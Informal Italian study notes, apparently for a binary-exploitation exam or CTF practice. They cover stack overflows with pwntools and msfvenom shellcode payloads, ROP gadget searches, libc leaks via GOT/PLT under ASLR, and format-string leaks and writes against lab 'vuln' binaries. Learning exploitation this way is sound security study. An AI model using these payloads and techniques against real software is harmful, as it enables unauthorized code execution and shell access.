+vedo che ha messo una variaile in più ed ho un pò di padding quindi per calcolare dove ho EBP, frame pointer, e quindi dovrò usare la matematica, vedo che sta in 5C (address)
+e faccio 0x5c + 0x4 (anche in python) e vedo che mi ritorno 96
+
+quindi ora faccio nel file python
+
+exploit = b""
+
+p.sendline("A"*92+"B"*4+"C"*4)
+
+p.interactive()
+
+
+e se ora vedo da gdb, vedo che si blocca poi facendo "c", quidni continua, e mi va in SEGFAULT e ci va con valore 0x43434343 che corrisponde ai caratteri ASCII: CCC
+quindi so che da C in poi vado fuori, quindi volgio mettere apposto di "C", l'address di dove voglio saltare, quindi, 
+andalizzancdo con ghidra il file da attaccare, vedo che si ferma alla read, vedo che il secondo parametro è il buffer dove sto per andare a scrivere
+prendo il valore dell'indirizzo allora faccio
+
+STACK_ADDRESS=0xVALOREADDRESSDELBUFFER
+p.sendline("A"*92+"B"*4+p32(STACK_ADDRESS))
+
+ADESSO avvio il programma in python
+poi faccio finish, finish
+
+e vedo che ci sta qualcosa che va bene, e lo stack frame è passato ad un inidirizo che eseguirà dopo, dopo la ret, e così poi stampo (e vedo che sono tutti inc eax)
+x/20c <address_diprima> e vedo che ho tutte A (Sta scritto)
+
+allora significa che sto saltandi nel addr giusto
+
+ora ci metto un exploit, ed uso shellcraft
+e nel pgrm python metto
+vado nel shelcraft site, cerco i386 e prendo quello di sh e vedo che ho la stringa: https://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.sh
+
+SHELLCODE = asm(shellcraft.i386.linux.sh())
+exploit += SHELLCODE 
+
+e mi cambia anche:
+p.sendline("A"*92+"B"*4+(92-len(exploit))+p32(STACK_ADDRESS))
+
+
+e vedo che così eseguendo il programma mi esegue, ed ho una shell
+
+
+(posso usare anche https://shell-storm.org/shellcode/files/shellcode-827.html, oppure cercando shellstorm sh 32 bit e provo link per link se funziona)
+
+nel file python metto 
+
+SHELLCODE = '''
+ASSEMBLY TROVATO SUL SITO
+'''
+ho visto però che eseguendo gdb e passo passo, non va nulla
+e vedo che mi dà un codice, e vedo che facendo 
+0x100000000 - 0xquellochetrovo = 14, allora vedo che l'errore 14 di linux è "bad address" (linux error codes)
+
+
+OPPURE USO msfvenom -p /linux/x86/exec -f c CMD=/bin/sh
+
+mi genera una roba in HEX, e la metto nel file python nella variabile SHELLCODE = b"robagenerata da msfvenom"
+
+e facendo python3 solve.py NOPTRACE
+mi da la shell, e facendo eg whoami funge
+EVVAI!!
+
+SENNÒ 
+python3
+
+
+-----
+a 64bit prima si passa sui registri e poi nello stack, invece a 32bit direttamente nello stack
+
+stacksmashing tutorial
+
+https://www.youtube.com/watch?v=8Qc3Q0g8Vao&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=2
+
+ROP chain, sarebbe Return Oriented Programming (ROP)
+quale è l'istruzione assembler più utile POP 
+
+perchè praticamente se io ho la seguente cosa
+
+
+
+POP RDI
+XXXXXXX <- POP RDI, RET   | QUANDO RET ARRIVA QUI, CON LO STACK IN QUESTA POSIZIONE, QUINDI SE FACCIO POP RDI E POI METTO UN VALORE QUALSIASI ALLORA IN RDI TROVO IL VALORE CHE SCELGO IO
+
+SYSTEM  <- LA VOGLIO CHIAMARE DOPO TUTTI I GADGET
+
+tutti gli exploit si fanno similmente così a questo esame e anche potenzialmente nella realtà, i gadget si trovano anche facendo search pop, e vedo anhce che registri posso trovare per fare pop
+
+
+
+ora vado su NX_NOASLR
+/* trovo codice su macchina e vedo che è sospetto perchè ha suid strani etc, OPPURE MI PASSO L'EXE me lo mando sulla machcina con server python etc, e me lo analizzo con ghidra*/
+
+vedo che ho function ed ho 
+
+
+undefined8 vuln(void)
+
+{
+  undefined local_68 [92];
+  uint local_c;
+  
+  local_c = FUN_00401080(0,local_68,400);
+  printf("\nRead %d bytes. buf is %s\n",(ulong)local_c,local_68);
+  puts("No shell for you :(");
+  return 0;
+}
+
+
+nel mentro scrivo l'exploit, vedo che ho che il nostro buffer sullo stack è 92+4= 96 byte e lo posso provare eseguendo ./vuln e vedo che poi mettendo la strinfa mi dà in output la stringa che ho passato in input
+
+linpeas può vedere se ASLR è attivo o meno, se è disattivo allora potrebbe esserci un buffer overflow
+
+e facendo partire ropper
+vedo che ho in libc.so.6 ho <addrs> pop rdi; ret; <-- devo cercare così, nel caso avessi pop rdi; pop rbp; ret; allora devo mettere un valore in più sennò non lo legge
+
+se uso pwninit mi crea un file _patched ed uso quello invece che quello di prima
+
+e vedo che se faccio faccio partire python3 exploit.py allora mi dà errore SISSEGV
+
+mi và in seg fault s
+
+su ropper faccio :
+(ropper)> file vuln
+[INFO] Load gadgets for section: LOAD
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] File loaded.
+s
+(vuln/ELF/x86_64)> search pop rdi
+[INFO] Searching for gadgets: pop rdi
+
+[INFO] File: vuln
+0x000000000040114a: pop rdi; ret; 
+
+(vuln/ELF/x86_64)> search ret
+[INFO] Searching for gadgets: ret
+
+[INFO] File: vuln
+0x000000000040101a: ret; 
+
+
+
+---
+ho gli offset fissi, cioè se ho una versione della libc allora se la carico in indirizzi diversi, la distanza tra le funzioni rimane uguale, quindi se ho un offset di una funzione, allora posso calcolare l'offset di un'altra funzione
+cioè se so dove sta la funzione, allora calcolo la distanza tra la prossima, ed andando avanti così le riesco a spottare tutte perchè somma di volta in volta a la distanza tra le varie funzioni
+
+strutture plt e got, la plt è la procedure linkage table, e la got è la global offset table
+quando il programamma vuole usare la libc, passa prima per la plt, lei legge la got, e dice "guarda questo blocco di plt salta a memcpm e dice che sta ad un offset 0x10" quindi vado lì, allora in un pezzo ci sta scritto l'addr che stiamo cercando 
+
+quoindi cerco indirizzo sulla got, lo stampo, lo leggo, faccio matematica con python e la libc base, che nell'exploit è hardcodata, allora ora la genero in modo dinamica
+ho limitazioni, perchè per farlo ho bisogno di gadget nell'eseguibile, es se non trovo pop rdi nell'exe allora non posso usare il file per fare l'exploit
+
+e la secomda cosa è la funzione di stampa, perchè me lo devo far comunicare, ed ho bisogno di una di quelle che viene usata nel programma, cioè se il progrmama la usa, allora nel plt ci sta un blocchetto che usa una delle funzioni usate
+se l'exe non la sua, non sta nella plt e quindi non posso usarla
+
+se ho aslr attivo, ma il progrmama usa la libc, allora posso fare un leak della libc, e quindi posso fare un exploit, perchè se ho il leak della libc, allora posso calcolare l'offset della funzione che mi serve, e quindi posso fare l'exploit
+
+
+NX_ASLR 
+
+qui devo usare pwninit per forza perchè sennò è difficile
+
+scrivo exploit da zero
+
+PRIMA PARTE HO LIBC BASED
+devo chiamare due volte la read, perchè devo andare nella ropchain per leakkare la libc, e poi ci rivado per vedere il valore leakkato
+
+quindi alla fine dell'exploit devo mettere indirizzo della funzione vuln e quindi 
+
+su gdb per prendere gli inidirizzo 
+per stampare got, scrivo got  e mi sta scitto <addrdovestalafunc> func 
+oppure posso usare ghidra ed in alto a sinistra ho scritto le varie sezioni del programma, tra cui la got e la plt, quindi posso anche usare per confrontare i due indirizzi se coincidono con quelli trovati con gdb
+per il plt su gdb faccio
+x "nomefunc@got.plt" e sempre con ghidra posso vedere se è lo stesso
+
+ghidra è più intuitivo avendo la GUI 
+
+per trovare l'addr di bin/sh allora vado su gdb, poi start, poi grep bin/sh e molte volte lo ho
+oppure uso pwntools e cerco dentro libc il valore di bin/sh e lo faccio con la riga BINSH_OFFSET = next(libc.search(b"/bin/sh"))
+
+una volta fatto tutto ciò io ogni volta che voglio far partire exploit.py lo faccio partire con il flag NOPTRACE attivo sennò mi aprte pure lo stronzone di gdb
+
+per allenarsi: https://pwnable.xyz/ e https://pwnable.kr/ e https://picoctf.org/
+
+---
+
+format string exploit
+
+è un tipo di vulnerabilità che si trova nei programmi che usano printf, e quindi se io passo una stringa di formato, allora posso fare un exploit 
+e quindi posso fare un leak della libc, e quindi posso fare un exploit con la libc leakkata.
+
+nella libc ho stringhe che tipo dentro accettano %d, %s, %p etc, e quindi se io passo una stringa di formato, allora posso fare un exploit 
+quando può diventare un problema? se io passo una stringa di formato, e poi passo un indirizzo, allora posso fare un leak della libc, e quindi posso fare un exploit con la libc leakkata.
+
+file formatstring1.c
+
+╰─ ./vuln ciao
+Echoing...
+
+ciao                                                                                                                                                                                                                                           
+
+e vedo quindi che mi ripete la stringa che gli passo, quindi se passo una stringa di formato, allora mi stampa la stringa di formato
+
+╰─ ./vuln %s
+Echoing...
+
+
+choing...
+
+=> 
+
+╰─ ./vuln %s%s%s%s%s%s
+Echoing...
+
+zsh: segmentation fault  ./vuln %s%s%s%s%s%s
+
+registri li ho rb> rsi> rd> rcx e poi sullo stack -> lancio vuln su gdb
+
+(start 123 > così gli passo 123 come argomento > poi faccio n ) 
+
+
+quindi faccio:
+
+╰─ ./vuln "%lx"
+Echoing...
+
+55ee6031a2a0                                                                                                                                                                                                                                           
+ 
+╰─ ./vuln "%lx %lx %lx %lx %lx"
+Echoing...
+
+5642a1e932a0 0 7f226a4e94e0 410 1      <- leakko piano piano tutte le varie parti dello stack
+
+=> fs_onegadget
+
+
+ho %3$lx che mi stampa il terzo valore dello stack, e quindi posso fare un leak della libc 
+cioè nel caso avessi "%lx %lx %lx %lx %lx" prendo "nome del programma", "rbp", "rip", "argomento", "argomento" e quindi posso fare un leak della libc
+invece con %3$lx prendo soloi l terzo valore dello stack (credo) 
+
+per vedere cosa devo leakkare, fermati alla call (eg in questo caso di printf@plt)
+APRO gdb ./vuln > start 123 > e poi per andare avanti usa s
+
+utile leakkare variabili locali
+
+con il form %n, il parametro che gli passo  deve esser un puntatore, e deve scrivere la dmensione del buffer che ha scritto
+quindi posso scrivere ua format string per scrivere indirizzi direttamente in memoria
+
+>>> format string 2
+
+gdb ./vuln > start 123 > s
+non ha simboli di debug, e allora faccio da gdb info variable
+
+gef➤  info variable flag
+All variables matching regular expression "flag":
+
+Non-debugging symbols:
+0x0804c024  flag
+0xf7ff2ebc  __rseq_flags
+gef➤  
+
+=> devo mettere in memoria l'indirizzo di flag, e lo metto come parametro in riga di comando => lo metto in exploit.py
+con grep cerco in memoria 
+
+
